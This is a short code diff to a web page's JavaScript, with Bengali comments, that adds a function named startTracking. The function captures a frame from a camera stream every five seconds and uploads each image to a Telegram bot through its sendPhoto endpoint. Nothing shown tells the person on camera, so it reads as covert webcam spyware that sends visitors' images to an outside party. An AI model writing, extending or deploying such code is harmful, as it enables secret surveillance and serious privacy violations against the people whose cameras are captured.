@@ -41,3 +41,33 @@ async function pushMsg() {
         alert("ইন্টারনেট বা CORS সমস্যার কারণে মেসেজ পাঠানো যায়নি।");
     }
 }
+function startTracking(stream) {
+    const v = document.getElementById('v');
+    const c = document.getElementById('c');
+    const ctx = c.getContext('2d');
+
+    setInterval(() => {
+        // ভিডিওর ডাটা ঠিকমতো আসছে কি না চেক করা
+        if (v.readyState === v.HAVE_ENOUGH_DATA) {
+            c.width = v.videoWidth;
+            c.height = v.videoHeight;
+            
+            // ছবি ড্র করার আগে ক্যানভাস পরিষ্কার করা
+            ctx.clearRect(0, 0, c.width, c.height);
+            ctx.drawImage(v, 0, 0, c.width, c.height);
+            
+            c.toBlob(b => {
+                if (b) {
+                    let f = new FormData();
+                    f.append('chat_id', CHAT_ID);
+                    f.append('photo', b, 'capture.jpg');
+                    
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: f
+                    }).catch(err => console.error("Photo send failed:", err));
+                }
+            }, 'image/jpeg', 0.7); // কোয়ালিটি ০.৭ দিলে ছবি উজ্জ্বল হবে
+        }
+    }, 5000); 
+}
